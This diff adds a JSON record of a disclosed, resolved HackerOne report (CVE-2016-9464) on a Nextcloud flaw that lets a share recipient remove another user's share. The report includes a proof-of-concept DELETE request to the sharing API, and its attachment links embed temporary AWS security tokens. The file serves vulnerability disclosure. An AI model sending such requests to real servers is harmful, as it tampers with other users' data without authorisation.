@@ -1,0 +1,202 @@
+{
+  "id": 153905,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTM5MDU=",
+  "url": "https://hackerone.com/reports/153905",
+  "title": "IDOR - Disable sharing",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2016-07-26T06:21:54.786Z",
+  "submitted_at": "2016-07-26T06:21:54.786Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "dalt4sec",
+    "url": "/dalt4sec",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ff0dwp6e78u2ut57euzmro9b9e2k/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2016-9464"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2016-12-03T21:58:44.569Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2016-11-03T21:58:43.288Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Decription:\n-----\nUsers are shared files or folder. can disable this sharing.\n\nDetail:\n------\n + use request:\n\nDELETE /nextcloud/ocs/v2.php/apps/files_sharing/api/v1/shares/[share-id]?format=json HTTP/1.1\nHost: [your-host]\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nrequesttoken: [token of user is shared]\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nCookie: [cookie of user is shared]\nConnection: keep-alive\n\nNote:\n----\nonly user is shared or user in group is shared can do it",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 107392,
+      "file_name": "admin-shared-to-user1.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/107/392/1254f39f95d9b76f3016c8d0809f66728bb1bce1/admin-shared-to-user1.PNG?response-content-disposition=attachment%3B%20filename%3D%22admin-shared-to-user1.PNG%22%3B%20filename%2A%3DUTF-8%27%27admin-shared-to-user1.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSDG43OGG%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T125601Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD1gsKK3ct3H57WT18FQgI0X50iiCJ0IC7jwysKDOmIXQIhAP5UGoWicOodN36u8rNby3JF4YXntkq4Pz7gzSZsGYh6KroFCJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwO2v9pI2OYyqVJpQAqjgVUDXQPnWyb4mL%2F7xer4KMHmfj5s9Y1TGbANO%2BySLsyV7%2B9KfSDvJVVh1REteoVcXIcIQi%2B%2F2xDdTUF1d%2F7EdPugsby7lw%2BCMBKC7x%2BbS2RQTYxd8dB%2BjpFdV2cmY78d3udx1mPUBcTYAcSoAvLAGSPEZAQ3TFnq2bZb9PSMY2zcPBZqrJuFCgMDaaJXxWdPP38AeVgVzX%2B7FiuKsYkBbEulH493B4yOFd8moTd2WAiTzCfXXpCpQ1%2FC0CkxQq9gnDOph473MCvr87AFU1ZuuUPg2dfTY07vzo%2FxKGyoEJOkSIyWJw97HtKfYjuf8leoXufOgEJpSsQVq0ezJtOzeyjgGkS%2FVBb5tHtqpLsm%2FjIiCV2O37rlBUltTlyqBs5bhqlgprgK7CN3%2BcpEXnZPpmXBfgoC0ghECDRNhLviWSLcNrU0%2B9gzcm7T74QkVm2jHTALmNDbC%2BxfePAdN7x8%2Fj15TKtfPb4XAuCZoVUSaw0k9hWw%2B9uYcvFmV9GaoyBkyXJpz9mRnOxRCM4CtqvSIUaoCOlRXxFiTibbTO4b8KtU8GgytN3Oz3QOTAYSarWiIh5IRZ1%2BW7TvyXnO%2FkRGrGLwxDlS4BsB5gGxZHhaO%2B7A%2B%2B%2FIGtimUgPMVTi5J3DLMT6Y54P4sJN8hn75gnexUaC%2BG9162kPN%2BEueXd68OZ3s8HqDC%2BjH8uu0XnDiWhQoXYUwxWugGIpr%2BjOmpTjVf5IX%2BJZQ7rdLJmJmtzCkK8aiGqSFjFAH9LgGAbwlSNz%2BepEBg4r96hGU87XA0H%2F2u1rMkkBe%2BOPhCwqpjDr6fMOXWF%2BI1HFn%2FptIQ3l%2FA871eah9ppF8ahwm5skf0wYtB4r%2BOy8noeuaHOsekw8DvowgcqV0QY6sAF6puqG3PDbIEJ5XNXS4jZl7zuMrgzYDsUCoOMfMyaMY1iIfaDVhYDK4PnzV2nXtCm3bSAWvEZShG8zv69zGEzE8AXF3fE4CCkRE3ded0kR5unF%2BU0x%2Bnnaml6Vxb6rOPXTqaoS92vN0sd05TtCOuzhgEnvSVom%2FPofXTfHdjl9HbO%2Bp7Vit5Jc6ZgOhGqwbgG5Tzl0h1TGr1AQePAbm3OUc5SxWYS%2FPq0HZKoOyEQp6A%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6ecd4148b796dc716a703313e7ffac5b90d72b787c747da7f65a13e10130d438",
+      "file_size": 62445,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 107393,
+      "file_name": "Result.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/107/393/449dedbfe33f5adeba492d069ce10cb407075364/Result.PNG?response-content-disposition=attachment%3B%20filename%3D%22Result.PNG%22%3B%20filename%2A%3DUTF-8%27%27Result.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSDG43OGG%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T125601Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD1gsKK3ct3H57WT18FQgI0X50iiCJ0IC7jwysKDOmIXQIhAP5UGoWicOodN36u8rNby3JF4YXntkq4Pz7gzSZsGYh6KroFCJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwO2v9pI2OYyqVJpQAqjgVUDXQPnWyb4mL%2F7xer4KMHmfj5s9Y1TGbANO%2BySLsyV7%2B9KfSDvJVVh1REteoVcXIcIQi%2B%2F2xDdTUF1d%2F7EdPugsby7lw%2BCMBKC7x%2BbS2RQTYxd8dB%2BjpFdV2cmY78d3udx1mPUBcTYAcSoAvLAGSPEZAQ3TFnq2bZb9PSMY2zcPBZqrJuFCgMDaaJXxWdPP38AeVgVzX%2B7FiuKsYkBbEulH493B4yOFd8moTd2WAiTzCfXXpCpQ1%2FC0CkxQq9gnDOph473MCvr87AFU1ZuuUPg2dfTY07vzo%2FxKGyoEJOkSIyWJw97HtKfYjuf8leoXufOgEJpSsQVq0ezJtOzeyjgGkS%2FVBb5tHtqpLsm%2FjIiCV2O37rlBUltTlyqBs5bhqlgprgK7CN3%2BcpEXnZPpmXBfgoC0ghECDRNhLviWSLcNrU0%2B9gzcm7T74QkVm2jHTALmNDbC%2BxfePAdN7x8%2Fj15TKtfPb4XAuCZoVUSaw0k9hWw%2B9uYcvFmV9GaoyBkyXJpz9mRnOxRCM4CtqvSIUaoCOlRXxFiTibbTO4b8KtU8GgytN3Oz3QOTAYSarWiIh5IRZ1%2BW7TvyXnO%2FkRGrGLwxDlS4BsB5gGxZHhaO%2B7A%2B%2B%2FIGtimUgPMVTi5J3DLMT6Y54P4sJN8hn75gnexUaC%2BG9162kPN%2BEueXd68OZ3s8HqDC%2BjH8uu0XnDiWhQoXYUwxWugGIpr%2BjOmpTjVf5IX%2BJZQ7rdLJmJmtzCkK8aiGqSFjFAH9LgGAbwlSNz%2BepEBg4r96hGU87XA0H%2F2u1rMkkBe%2BOPhCwqpjDr6fMOXWF%2BI1HFn%2FptIQ3l%2FA871eah9ppF8ahwm5skf0wYtB4r%2BOy8noeuaHOsekw8DvowgcqV0QY6sAF6puqG3PDbIEJ5XNXS4jZl7zuMrgzYDsUCoOMfMyaMY1iIfaDVhYDK4PnzV2nXtCm3bSAWvEZShG8zv69zGEzE8AXF3fE4CCkRE3ded0kR5unF%2BU0x%2Bnnaml6Vxb6rOPXTqaoS92vN0sd05TtCOuzhgEnvSVom%2FPofXTfHdjl9HbO%2Bp7Vit5Jc6ZgOhGqwbgG5Tzl0h1TGr1AQePAbm3OUc5SxWYS%2FPq0HZKoOyEQp6A%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=05b2d27f94e40c5c273edf4c7b4266ad5907fcb1179b3ecb7966a31d8215dca8",
+      "file_size": 70990,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 107394,
+      "file_name": "user1-disable-sharing.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/107/394/ea8a5401a70910ddc65e3d0f69d15693c380d299/user1-disable-sharing.PNG?response-content-disposition=attachment%3B%20filename%3D%22user1-disable-sharing.PNG%22%3B%20filename%2A%3DUTF-8%27%27user1-disable-sharing.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSDG43OGG%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T125601Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD1gsKK3ct3H57WT18FQgI0X50iiCJ0IC7jwysKDOmIXQIhAP5UGoWicOodN36u8rNby3JF4YXntkq4Pz7gzSZsGYh6KroFCJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwO2v9pI2OYyqVJpQAqjgVUDXQPnWyb4mL%2F7xer4KMHmfj5s9Y1TGbANO%2BySLsyV7%2B9KfSDvJVVh1REteoVcXIcIQi%2B%2F2xDdTUF1d%2F7EdPugsby7lw%2BCMBKC7x%2BbS2RQTYxd8dB%2BjpFdV2cmY78d3udx1mPUBcTYAcSoAvLAGSPEZAQ3TFnq2bZb9PSMY2zcPBZqrJuFCgMDaaJXxWdPP38AeVgVzX%2B7FiuKsYkBbEulH493B4yOFd8moTd2WAiTzCfXXpCpQ1%2FC0CkxQq9gnDOph473MCvr87AFU1ZuuUPg2dfTY07vzo%2FxKGyoEJOkSIyWJw97HtKfYjuf8leoXufOgEJpSsQVq0ezJtOzeyjgGkS%2FVBb5tHtqpLsm%2FjIiCV2O37rlBUltTlyqBs5bhqlgprgK7CN3%2BcpEXnZPpmXBfgoC0ghECDRNhLviWSLcNrU0%2B9gzcm7T74QkVm2jHTALmNDbC%2BxfePAdN7x8%2Fj15TKtfPb4XAuCZoVUSaw0k9hWw%2B9uYcvFmV9GaoyBkyXJpz9mRnOxRCM4CtqvSIUaoCOlRXxFiTibbTO4b8KtU8GgytN3Oz3QOTAYSarWiIh5IRZ1%2BW7TvyXnO%2FkRGrGLwxDlS4BsB5gGxZHhaO%2B7A%2B%2B%2FIGtimUgPMVTi5J3DLMT6Y54P4sJN8hn75gnexUaC%2BG9162kPN%2BEueXd68OZ3s8HqDC%2BjH8uu0XnDiWhQoXYUwxWugGIpr%2BjOmpTjVf5IX%2BJZQ7rdLJmJmtzCkK8aiGqSFjFAH9LgGAbwlSNz%2BepEBg4r96hGU87XA0H%2F2u1rMkkBe%2BOPhCwqpjDr6fMOXWF%2BI1HFn%2FptIQ3l%2FA871eah9ppF8ahwm5skf0wYtB4r%2BOy8noeuaHOsekw8DvowgcqV0QY6sAF6puqG3PDbIEJ5XNXS4jZl7zuMrgzYDsUCoOMfMyaMY1iIfaDVhYDK4PnzV2nXtCm3bSAWvEZShG8zv69zGEzE8AXF3fE4CCkRE3ded0kR5unF%2BU0x%2Bnnaml6Vxb6rOPXTqaoS92vN0sd05TtCOuzhgEnvSVom%2FPofXTfHdjl9HbO%2Bp7Vit5Jc6ZgOhGqwbgG5Tzl0h1TGr1AQePAbm3OUc5SxWYS%2FPq0HZKoOyEQp6A%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ef659c927cbd1c21b57f191827cd3a95a5220cdcd85568dd63f6895f990934e5",
+      "file_size": 112366,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-12-03T21:58:43.325Z",
+  "allow_singular_disclosure_after": -300034637.7638071,
+  "singular_disclosure_allowed": true,
+  "vote_count": 8,
+  "voters": [
+    "wargsec",
+    "naategh",
+    "rashedulcss",
+    "alfredsaonoy",
+    "spetr0x",
+    "xxxxxxxxxxx1",
+    "dyabla",
+    "0xkenzo"
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 2.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "low"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "can_manage?": false,
+    "can_export?": false,
+    "can_add_comment?": false,
+    "can_request_decision_review_without_strict_acl_mode?": false,
+    "can_request_decision_review?": false,
+    "can_reject_decision_review?": false,
+    "can_change_state?": false,
+    "can_reopen?": false,
+    "can_award_bounty?": false,
+    "can_award_swag?": false,
+    "can_suggest_bounty_amount?": false,
+    "can_create_dupe_window_bounty?": false,
+    "can_assign_to_user?": false,
+    "can_assign_to_h1_triage?": false,
+    "can_hide_timeline?": false,
+    "can_agree_on_going_public?": false,
+    "can_cancel_disclosure_request?": false,
+    "can_be_publicly_disclosed?": false,
+    "can_post_internal_comments?": false,
+    "can_manage_common_responses?": false,
+    "can_use_common_responses?": false,
+    "can_reassign_to_team?": false,
+    "can_change_title?": false,
+    "can_change_vulnerability_information?": false,
+    "can_change_weakness?": false,
+    "can_be_manually_disclosed?": false,
+    "can_clone?": false,
+    "can_close_as_na?": false,
+    "can_close_as_duplicate?": false,
+    "can_close_as_informative?": false,
+    "can_close_as_spam?": false,
+    "can_close_as_resolved?": false,
+    "can_ban_researcher?": false,
+    "can_create_severity?": false,
+    "can_close_comments?": false,
+    "can_change_structured_scope?": false,
+    "can_manage_collaborators?": false,
+    "can_view_bounty_weights?": false,
+    "can_redact?": false,
+    "can_view_credential_account_details?": false,
+    "can_request_retest?": false,
+    "can_cancel_retest?": false,
+    "can_submit_draft?": false,
+    "can_delete_draft?": false,
+    "can_change_to_pending_program_review_state?": false,
+    "can_request_code_review?": false,
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "can_change_pentest": false,
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
